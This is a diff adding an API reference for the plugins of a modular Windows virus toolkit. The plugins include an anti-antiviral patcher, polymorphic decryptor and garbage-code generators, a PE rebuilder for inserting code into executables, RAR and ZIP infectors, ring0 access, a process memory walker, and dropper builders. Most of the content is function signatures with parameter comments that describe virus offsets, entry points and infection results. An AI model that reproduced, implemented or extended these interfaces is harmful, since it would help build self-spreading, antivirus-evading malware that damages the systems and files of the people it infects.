@@ -1,0 +1,338 @@
+
+=============================================================================
+
+plugin:     AAVPATCH
+subroutine: patch_buf
+action:     apply anti-antiviral patch to a buffer
+returns:    # bytes patched, 0 if no patch applied
+
+int __cdecl patch_buf(BYTE* buf, DWORD bufsize, int useMZ);
+
+  useMZ == 1 --> enable {cmp ..., 'MZ'/'NE'/'PE'/...} patching
+
+=============================================================================
+
+plugin:     ADDPGN
+subroutine: addpgn_attach
+action:     attach incoming packet of signed plugins
+returns:    # of plugins attached
+see also:   updating.txt
+
+int __cdecl addpgn_attach(BYTE* buf, DWORD bufsize);
+
+=============================================================================
+
+plugin:     CODEGEN
+subroutine: cg_engine
+action:     compile meta-command into random asm instructions
+see also:   codegen.hpp
+
+void __cdecl cg_engine(
+   BYTE*  bufptr,
+   DWORD* outbufsize,
+   DWORD  regfree,
+   BYTE*  __cdecl user_fixup(BYTE* outptr, DWORD value),   // both may be NULL,
+   BYTE*  __cdecl user_trash(BYTE* outptr, DWORD regfree), // both returns modified outptr
+   DWORD  cmd_x_x,  // cmd_v_c/cmd_v_v/cmd_v_memv/cmd_memv_v/cmd_r_r/cmd_r_c/cmd_r_memr/cmd_memr_r/cmd_r_v/cmd_v_r
+   DWORD  cmd_xxx,  // cmd_mov/cmd_add/cmd_sub/cmd_xor/cmd_cmp
+   DWORD  arg1,     // reg, var or const
+   DWORD  arg2);
+
+=============================================================================
+
+plugin:     DEBUG
+subroutine: printf
+action:     debug printf
+
+void __cdecl printf(char* fmt, ...);
+
+   fmt: only %s and %nnX supported
+
+=============================================================================
+
+plugin:     ETG
+subroutine: etg_engine
+action:     generate buffer containing specified garbage opcodes
+see:        etg.hpp
+
+void __cdecl etg_engine(
+  DWORD  cmd_avail,   // set of ETG_xxx
+  DWORD  regsrcavail, // set of REG_xxx
+  DWORD  regdstavail, // set of REG_xxx
+  DWORD* osizeptr,    // ptr to generated bufsize plugin:
+  DWORD  ncmds,       // max number of commands   subroutine:
+  DWORD  bufsize,     // max size of buffer       action:
+  BYTE*  buf);        // ptr to output buffer     returns:
+
+=============================================================================
+
+plugin:     FILEIO
+
+DWORD __stdcall fcreate (char* fname);    // returns 0 if error
+DWORD __stdcall fopen_ro(char* fname);    //
+DWORD __stdcall fopen_rw(char* fname);    //
+DWORD __stdcall fclose(DWORD handle);
+DWORD __stdcall fread (DWORD handle, BYTE* buf, DWORD bufsize, DWORD fpos); // returns numread
+DWORD __stdcall fwrite(DWORD handle, BYTE* buf, DWORD bufsize, DWORD fpos); // returns numwritten
+DWORD __stdcall fgetattr(char* fname);    // returns FFFFFFFF if error
+int   __stdcall fsetattr(char* fname, DWORD attr); // returns 0 if error
+DWORD __stdcall fgetsize(DWORD handle);
+int   __stdcall fdelete(char* fname);                    // returns 0 if error
+int   __stdcall frename(char* srcfile, char* dstfile);   // returns 0 if error
+
+DWORD __stdcall findfirst(char* fname,  struct ff_struct* ff); // returns 0 if error
+DWORD __stdcall findnext (DWORD handle, struct ff_struct* ff); // returns 0 if error
+void  __stdcall findclose(DWORD handle);
+
+void  __stdcall fgettimev(DWORD handle); // r3-only , single-threaded
+           // get file datetime
+void  __stdcall fsettimev(DWORD handle); // last_write_time += 2 sec
+           // set file datetime to previously saved increased by 2 sec
+
+=============================================================================
+
+plugin:     KME
+subroutine: kme_engine
+action:     build poly decryptor
+see also:   kme.hpp
+returns:    1 if all OK, 0 if error
+
+int __cdecl kme_engine(
+      DWORD  regsave,          // push/pop regs at prolog/epilog, set of KME_REG_XXX
+      DWORD  original_rva,     // original entry RVA
+      DWORD  vir_rva,          // virus in-file RVA
+      DWORD* exitregptr,       // 0 or pointer to 8 dwords
+      DWORD* initregptr,       // 0 or pointer to 8 dwords
+      BYTE*  i_offs,           // virus offset
+      DWORD  i_size,           // virus size
+      DWORD  i_entry,          // virus entry (relative)
+      BYTE*  o_offs,           // output offset
+      DWORD  o_max,            // output max buf size
+      DWORD  o_fillchar,       // character to fill out buf
+      DWORD* po_size,          // 0 or pointer to out buf size
+      DWORD* po_entry,         // 0 or pointer to out entry (rel.)
+      DWORD  jmp_prob,         // JMPs if rnd(jmp_prob)==0
+      DWORD  regavail,         // register set (KME_REG_XXX)
+      DWORD  cmdavail2,        // adv. command set (KME_CMD2_XXX)
+      DWORD  cmdavail,         // command set (KME_CMD_XXX)
+      DWORD  flags             // flags (KME_FLAG_XXX)
+     );
+
+=============================================================================
+
+plugin:     LDE
+subroutine: disasm
+action:     get length of the x86/87 opcode
+returns:    length of the opcode, or -1 if unknown {0F xx ...}
+
+int __cdecl disasm(BYTE* opcode);       // returns length in bytes or -1
+
+=============================================================================
+
+plugin:     LDRWIN32
+subroutine: Event
+action:     send event to other plugins
+returns:    # of plugins who handled event, or 0, or -1
+see also:   ldrwin32.hpp
+
+int __cdecl Event(DWORD EventID, DWORD UserParam);
+
+=============================================================================
+
+plugin:     LDRWIN32
+subroutine: ldrwin32_getinfo
+action:     get info about LDRWIN32.bin (binary loader)
+returns:    ptr to ldrwin32_info_struct
+
+ldrwin32_info_struct* __cdecl ldrwin32_getinfo();
+
+struct ldrwin32_info_struct
+{
+  BYTE* ldrwin32_ptr;           // pointer to loader (.bin)
+  DWORD ldrwin32_size;          // size of loader
+  DWORD ldrwin32_entry;         // relative to loader_start
+};
+
+=============================================================================
+
+plugin:     LDRWIN32
+subroutine: ldrwin32_copy
+comment:    INTERNAL!
+action:     build new pluginlist copy and b-cast event there
+
+int  __cdecl ldrwin32_copy(DWORD startup_event);                 // r3
+
+=============================================================================
+
+plugin:     LDRWIN32
+subroutine: ldrwin32_attach
+action:     attach packet of plugins
+returns:    # of plugins attached
+see also:   updating.txt, ldrwin32.hpp
+
+int  __cdecl ldrwin32_attach(BYTE* plugin, BYTE* maxsize);       // r3
+    // PGN2 [PGN2 [...]] <DD_0>
+
+=============================================================================
+
+plugin:     LDRWIN32
+subroutine: ldrwin32_detach_me
+action:     detach current plugin
+see also:   updating.txt
+
+=============================================================================
+
+plugin:     LDRWIN32
+subroutine: GetPluginList
+action:     get root plugin list entry
+see also:   pgn2.inc, pgn2.hpp
+
+list_entry* __cdecl GetPluginList();
+
+struct list_entry
+{
+pgn2_header*            list_phys;      // physical image
+BYTE*                   list_virt;      // *PE_in_memory, virtual image
+list_entry*             list_next;      // next list entry or NULL
+};
+
+=============================================================================
+
+plugin:     LDRWIN32
+subroutine: uniquestr
+action:     generate unique ascii string,
+            that depends on unique id and datetime of %windir% directory
+returns:    (char*)(buf+size), i.e. ptr to end-of-buf
+
+char* __cdecl uniquestr(char* buf, DWORD size, DWORD id);
+
+=============================================================================
+
+plugin:     MAKEBODY
+see also:   makebody.hpp
+
+int  __cdecl build_body   (struct makebody_info*);
+int  __cdecl build_dropper(struct makebody_info*);
+void __cdecl build_free();
+
+=============================================================================
+
+plugin:     MEMORY
+subroutine: malloc
+action:     allocate memory block
+returns:    ptr to block or 0
+
+BYTE* __stdcall malloc(DWORD size);            // returns 0 if error
+
+=============================================================================
+
+plugin:     MEMORY
+subroutine: mfree
+action:     free memory block
+
+void  __stdcall mfree (BYTE* memptr);
+
+=============================================================================
+
+plugin:     MISTFALL
+subroutine: mistfall_engine
+action:     disassemble & assemble given PE EXE/DLL file,
+            allowing caller (via callback)
+            to integrate some code into pe structure
+returns:    0 if ok, ERR_xxx if error
+see also:   mistfall.txt
+
+=============================================================================
+
+plugin:     RANDOM
+
+DWORD __stdcall rnd(DWORD range);
+DWORD __stdcall rnd_eax();
+DWORD __stdcall rnd_byte();
+DWORD __stdcall rnd_dword();
+DWORD __stdcall rnd_2();
+DWORD __stdcall rnd_3();
+DWORD __stdcall rnd_8();
+void  __stdcall rnd_zf();
+
+=============================================================================
+
+plugin:     RARZIP
+subroutine: infect_rar, infect_zip
+action:     the same
+returns:    1 if ok
+
+int __cdecl infect_rar(char* filename); // returns: 1 if infected
+int __cdecl infect_zip(char* filename);
+
+=============================================================================
+
+plugin:     RING0
+comment:    win9x
+subroutine: call_in_ring0
+see also:   ring0.asm
+
+int __cdecl call_in_ring0( int __cdecl r0proc(...), ... );
+
+=============================================================================
+
+plugin:     RSA
+subroutine: modexp
+action:     modular exponentiation
+
+void __cdecl modexp(int len,                           // key length, in BITs
+                    BYTE* x,BYTE* a,BYTE* b,BYTE* m,   // x = (a^b) % m
+                    BYTE* t1,                          // temporary
+                    BYTE* t2);                         // temporary, 2*size
+
+=============================================================================
+
+plugin:     RSA
+subroutine: hash_z1
+action:     calculate Z1-hash
+
+void __cdecl hash_z1(BYTE* ibuf, DWORD isize, BYTE* obuf, DWORD osize);
+
+=============================================================================
+
+plugin:     UTIL
+comment:    for sure, ring-independend subroutines
+
+DWORD __stdcall createkeyV(DWORD uniqID, DWORD*phkResult);
+DWORD __stdcall openkeyV  (DWORD uniqID, DWORD*phkResult);
+
+DWORD __stdcall createkey(DWORD hKey, char*lpSubKey, DWORD*phkResult);
+DWORD __stdcall openkey  (DWORD hKey, char*lpSubKey, DWORD*phkResult);
+DWORD __stdcall closekey (DWORD hKey);
+DWORD __stdcall setvalueex(DWORD hKey, char*lpValueName, DWORD Reserved,
+                           DWORD dwType, BYTE *lpData, DWORD cbData);
+DWORD __stdcall queryvalueex(HKEY hKey, char*lpValueName, DWORD lpReserved,
+                             DWORD*lpType, BYTE*lpData, DWORD*lpcbData);
+
+DWORD __stdcall gettime();
+DWORD __stdcall getwindir(char* buf260ptr);
+void  __stdcall uniquefname(char* buf260ptr, DWORD uniqID);
+
+=============================================================================
+
+plugin:     UUE
+subroutine: uuencode
+
+void __cdecl uuencode(BYTE*  ibuf,      // src buffer
+                      DWORD  isize,     // src buffer size (min=3)
+                      BYTE*  obuf,      // dst buffer
+                      DWORD* osize,     // ptr to dst buffer size
+                      char*  fname);    // filename
+
+=============================================================================
+
+plugin:     WALKER
+subroutine: walker_main
+action:     for each process, for each memory block, call callback
+see also:   walker.asm
+
+int __cdecl walker_main(int __cdecl callback1(char* fname),                   ±
+                        int __cdecl callback2(BYTE* buf, DWORD size));        ±
+
+=============================================================================
+
